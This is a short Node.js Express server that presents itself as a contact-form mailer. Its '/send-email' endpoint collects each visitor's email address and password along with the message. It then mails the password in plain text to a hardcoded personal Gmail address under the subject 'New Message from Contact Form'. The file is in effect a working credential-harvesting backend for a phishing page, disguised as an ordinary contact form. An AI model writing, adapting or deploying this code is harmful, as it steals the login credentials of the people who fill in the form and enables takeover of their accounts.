import express from 'express';
import { createTransport } from 'nodemailer';
import { json } from 'body-parser';
import cors from 'cors';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
const port = 5000;

app.use(json());
app.use(cors());

app.post('/send-email', (req, res) => {
    const { email, password, message } = req.body;

    const transporter = createTransport({
        service: 'gmail',
        auth: {
            user: process.env.EMAIL_USER,
            pass: process.env.EMAIL_PASS,
        },
    });

    const mailOptions = {
        from: email,
        to: 'AbdoSheko48@gmail.com',
        subject: 'New Message from Contact Form',
        text: `Email: ${email}\nPassword: ${password}\n\nMessage: ${message}`,
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.log(error);
            return res.status(500).json({ message: 'Error sending email' });
        }
        console.log('Email sent: ' + info.response);
        res.status(200).json({ message: 'Email sent successfully' });
    });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}/`);
});
